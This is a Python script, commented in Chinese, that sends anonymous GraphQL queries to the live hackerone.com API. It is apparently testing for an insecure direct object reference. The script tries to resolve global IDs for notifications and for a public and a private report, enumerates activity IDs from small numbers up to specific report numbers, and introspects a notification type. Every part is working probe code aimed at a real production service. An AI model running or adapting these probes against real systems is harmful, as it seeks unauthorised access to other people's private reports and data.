# -*- coding: utf-8 -*-
"""h1x52i: node(id) 通知/报告 global id 解析 + activity(id) IDOR 探测 + VirtualNotification 字段(匿名只读)"""
import sys, io, json
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, q):
    r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=20)
    print(f'--- {name} [{r.status_code}]')
    print(r.text[:500].replace('\n', ' '))
    print()

# 1. node(id) 解析通知 global id(匿名;id 来自用户 N1 结果)
probe('node_notif', '''query { node(id: "Z2lkOi8vaGFja2Vyb25lL05vdGlmaWNhdGlvbnNJbmRleC82NzA4OTc4ODk=") { id __typename } }''')
# 2. node 解析报告 global id(对照;2487889 的 gid = Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDg3ODg5)
probe('node_report_pub', '''query { node(id: "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDg3ODg5") { id __typename } }''')
probe('node_report_priv', '''query { node(id: "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzMyNjYw") { id __typename } }''')

# 3. activity(id:) 批量(小 id 枚举 + 猜测事件流 id)
for aid in [1, 2, 100, 1000, 100000, 2487889, 3732660]:
    probe('activity_%d' % aid, '''query { activity(id: %d) { __typename ... on ActivityUnion { } } }''' % aid)

# 4. VirtualNotification 字段
probe('virtual_notif', '''query { __type(name: "VirtualNotification") { kind fields { name type { kind name ofType { kind name ofType { kind name } } } } } }''')
